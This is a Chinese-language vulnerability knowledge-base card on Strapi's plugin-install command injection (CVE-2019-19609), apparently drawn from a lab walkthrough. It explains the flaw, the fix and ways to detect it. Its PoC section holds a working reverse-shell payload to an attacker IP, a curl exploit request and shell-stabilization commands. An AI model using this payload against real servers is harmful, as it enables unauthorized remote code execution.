---
id: web-nodejs-strapi-plugin-install-command-injection
title: Strapi 管理员插件安装命令注入：execa 拼接 plugin 参数导致 RCE（CVE-2019-19609）
type: scenario
domain: web
path: web/nodejs
technique: strapi-plugin-install-command-injection
tags:
- nodejs
- strapi
- command-injection
- rce
- execa
- admin-panel
- cve-2019-19609
cve:
- CVE-2019-19609
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: Strapi < 3.0.0-beta.17.8（原文实测 3.0.0-beta.17.4）
verification:
  verified_by: verifier-V63
  verified_at: '2026-11-05T12:02:20+08:00'
  notes: 已对照原文与 NVD 截图核对：CVE-2019-19609、受影响 < 3.0.0-beta.17.8、execa('npm',['run','strapi','--','install',plugin]) 经 npm run 的 sh -c 解释、$(...) 反弹 shell 载荷、修复正则白名单均一致。原文正文误写 CVE-2019-19606，卡内已正确标注并以 NVD 的 19609 为准。未验证点：PoC 未在本机执行。
url: /docs/web/nodejs/web-nodejs-strapi-plugin-install-command-injection/
draft: false
kb_aliases:
- CVE-2019-19609
- CVE-2019-19606
- Strapi 插件安装 RCE
- execa 命令注入
- npm run strapi install
- Strapi admin 命令执行
---

## 一句话结论

Strapi 管理端的插件安装/卸载接口把请求体中的 `plugin` 直接传给 `execa('npm', ['run', 'strapi', '--', 'install', plugin])`，未做任何字符过滤；由于 `npm run` 内部会通过 `sh -c` 执行脚本，`plugin` 中的 `$()`、`&&`、`;` 等 shell 元字符会被解释，管理员（或已接管管理员的攻击者）可借此执行任意命令，获得 Strapi 进程权限的 Shell。

## 原理

- 漏洞代码（`installPlugin`）：
  ```javascript
  const { plugin } = ctx.request.body;
  strapi.reload.isWatching = false;
  strapi.log.info(`Installing ${plugin}...`);
  await execa('npm', ['run', 'strapi', '--', 'install', plugin]);
  ```
  `uninstallPlugin` 同样把 `ctx.params.plugin` 拼进 `npm run strapi -- uninstall <plugin> -d`。
- `execa` 的标准用法是"可执行文件 + 参数数组"，正常情况下参数不会被 shell 解释；但这里的可执行文件是 `npm`，`npm run` 会在内部启动 shell 来执行 package.json 中的脚本，最终形成类似 `sh -c "strapi install <plugin>"` 的调用。`plugin` 中的 `$()`、反引号、`&&`、`;`、管道等会被 shell 解析。
- 因此 `plugin = "documentation && $(bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1')"` 会先执行合法的 `documentation` 安装（或直接失败），再执行注入的反弹 Shell。
- 为什么成立：Strapi 管理端把"插件名"当作可信字符串，但下游把它拼进了 shell 命令；这是典型的"参数数组看似安全、实际下游 shell 解释"的命令注入。
- 修复：官方在 `plugin` 进入 execa 前增加白名单正则 `if (!/^[A-Za-z0-9_-]+$/.test(plugin)) return ctx.badRequest('Invalid plugin name');`。
- 版本与 CVE 说明：原文正文写 CVE-2019-19606，但其引用的 NVD 页面与漏洞描述（"Install and Uninstall Plugin components... does not sanitize the plugin name... executed by the execa function"，影响 < 3.0.0-beta.17.8）对应 **CVE-2019-19609**；两处标签不一致，卡内以 NVD 描述为准，并把 19606 保留为原文写法。

## 触发条件

- Strapi 版本 < 3.0.0-beta.17.8（原文 3.0.0-beta.17.4）。
- 攻击者持有管理员 JWT（例如通过密码重置 NoSQL 注入获得，见关联卡）。
- `/admin/plugins/install`（或 uninstall）可达，且服务端能执行 `npm`/`sh`。
- Strapi 进程有可用的 shell 与出网/回连能力（反弹 Shell 需要）。

## 利用步骤

1. 获得管理员 JWT（见 [[web-nodejs-strapi-password-reset-nosql-injection]]）。
2. 在攻击机启动监听：`nc -lvnp 4444`。
3. 构造注入 payload：`plugin` 以合法插件名开头，后接 `&&` 与 `$()` 反弹 Shell；注意 RCE 的 shell 是 `sh`，反弹命令用 `bash -c` 包一层。
4. POST 到 `/admin/plugins/install`，携带 `Authorization: Bearer <JWT>`。
5. 收到反弹 Shell 后确认用户（原文为 `strapi`），做 PTY 稳定化。
6. 读取 user flag / 继续本地枚举。

## PoC

```json
{
  "plugin": "documentation && $(bash -c 'bash -i >& /dev/tcp/10.10.14.113/4444 0>&1')"
}
```

```bash
# 监听
nc -lvnp 4444

# 发送
curl http://api-prod.target/admin/plugins/install \
  -X POST -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer <ADMIN_JWT>' \
  --data @payload.json
```

```bash
# 收到 shell 后
whoami
# strapi

# 稳定化（目标有 python2）
python -c 'import pty;pty.spawn("/bin/bash")'
# 攻击机 Ctrl+Z 后：
stty raw -echo; fg
export TERM=xterm
```

说明：PoC 为原文流程的结构化复现，未在本机执行；仅用于授权测试。

## 变体与关联

- 变体：卸载接口 `/admin/plugins/uninstall/<plugin>` 同样拼接 `plugin`；可用 `$(...)`、反引号、`;`、`&&`、`|` 等。
- 变体：无回连时可用时间盲注（`sleep`）或写文件（`> /tmp/x`）确认命令执行。
- 变体：若 `npm run` 的 shell 行为因 npm 版本不同而变化，可用 `documentation; id` 或 `documentation && id` 先验证。
- 关联：[[web-nodejs-strapi-password-reset-nosql-injection]]（获取管理员 JWT）；[[web-php-framework-laravel-ignition-debug-log-phar-rce]]（同一靶机的下一跳提权）；[[web-nodejs-dokploy-compose-appname-stored-command-injection]]（Node.js 命令注入的同类形态）。
- 边界：非管理员、插件接口被禁用、版本已修复（beta.17.8+）、或 `npm` 不可执行时，本链不成立。

## 检测与防御

- 检测：`/admin/plugins/install` 请求体中的 `plugin` 含 `$(`、反引号、`;`、`&&`、`|`、空格等非插件名字符；Strapi 进程派生 `sh`/`npm` 并出现异常网络连接。
- 检测：管理员账号在短时间内修改密码、登录、安装插件——典型的接管后利用序列。
- 防御：升级到 3.0.0-beta.17.8+（或应用插件名白名单正则）；限制 `/admin` 访问来源；管理员启用 MFA。
- 加固：Strapi 进程以低权限用户运行，禁止其执行不必要的 shell/npm；容器内限制出网；对管理端操作做审计。

